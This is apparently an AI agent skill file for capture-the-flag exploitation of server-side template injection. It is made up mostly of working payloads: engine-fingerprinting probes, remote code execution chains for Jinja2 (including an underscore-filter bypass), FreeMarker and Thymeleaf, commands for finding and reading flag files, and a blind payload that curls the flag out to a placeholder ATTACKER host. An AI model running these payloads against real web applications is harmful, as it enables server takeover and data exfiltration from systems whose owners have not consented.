---
name: ssti
description: Server-Side Template Injection (SSTI). Use when user input reaches a template render (preview, search echo, name fields, report templates, error pages) and may be evaluated. Covers polyglot detection, engine fingerprinting, and RCE chains for Jinja2/Flask, FreeMarker, Twig, ERB, OGNL, SpEL. The high-value move is turning "input is echoed into a template" into RCE + flag read.
---

# SSTI — Server-Side Template Injection

## 1. Detect first (math probes, not XSS)

Send each and check if the math is EVALUATED server-side (returns the number, not the literal):

```
{{7*7}}        → 49  = Jinja2 / Twig
${7*7}         → 49  = FreeMarker / Velocity / Java EL
#{7*7}         → 49  = Ruby ERB
<#assign x=7*7>${x} → FreeMarker
@{7*7} / *{7*7} → Thymeleaf (SpEL)
```

Jinja2 vs Twig: `{{7*'7'}}` → `7777777` = Jinja2 (Python); `49` = Twig (PHP).
Safe probe: `{{''.__class__}}` → `class 'str'` = Python/Jinja2.

## 2. Map engine → language → RCE chain

| Engine | Lang | Framework | Syntax |
|---|---|---|---|
| Jinja2 | Python | Flask/FastAPI | `{{ }}` |
| Twig/Smarty | PHP | Symfony/Laravel | `{{ }}` / `{ }` |
| FreeMarker/Velocity | Java | Spring | `${ }` |
| Thymeleaf | Java | Spring Boot | `@{ }` / `*{ }` |
| ERB/Slim | Ruby | Rails | `<%= %>` / `#{ }` |
| OGNL | Java | Struts2 | `%{ }` |
| Jade/Pug/Handlebars | Node | Express | `#{ }` / `{{ }}` |

## 3. Jinja2 (Flask) RCE chains — try in order

```python
# 1. config globals (shortest)
{{config.__class__.__init__.__globals__['os'].popen('cat flag*').read()}}
{{lipsum.__globals__.os.popen('id').read()}}

# 2. MRO subclass traversal (sandbox escape, most reliable)
{{''.__class__.__mro__[1].__subclasses__()}}          # dump classes, find subprocess.Popen index
{{''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0]}}

# 3. request object globals (when `config` is blocked, `_` filtered → hex)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag*')|attr('read')()}}
```

Filtered chars: `_` → `\x5f`, `.` → `|attr()`, `[` → `__getitem__`. Flask debug PIN (Werkzeug console RCE): if the debugger is exposed, calculate the PIN from `machine-id` + `mac` + username (see Werkzeug `get_pin_and_cookie_name`).

## 4. Java engines (FreeMarker / Velocity / Thymeleaf)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}      # FreeMarker
${T(java.lang.Runtime).getRuntime().exec("id")}                          # Thymeleaf SpEL
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}
```

## 5. Read the flag, don't just run id

Once RCE works, the goal is the flag: `cat /flag*`, `cat /app/flag*`, `find / -name 'flag*' -exec cat {} \; 2>/dev/null`, `env | grep -i flag`. Blind SSTI (no output): use DNS/OOB (`{{config.__class__.__init__.__globals__['os'].popen('curl ATTACKER/$(cat flag)').read()}}`) or time-based.

## 6. Discipline

- Confirm evaluation with a math probe BEFORE building the full RCE chain.
- If one chain errors, switch chain (config → MRO → request), don't guess indexes — dump `__subclasses__()` and find the exact index.
- Read the flag locally and verify the format; submit once.
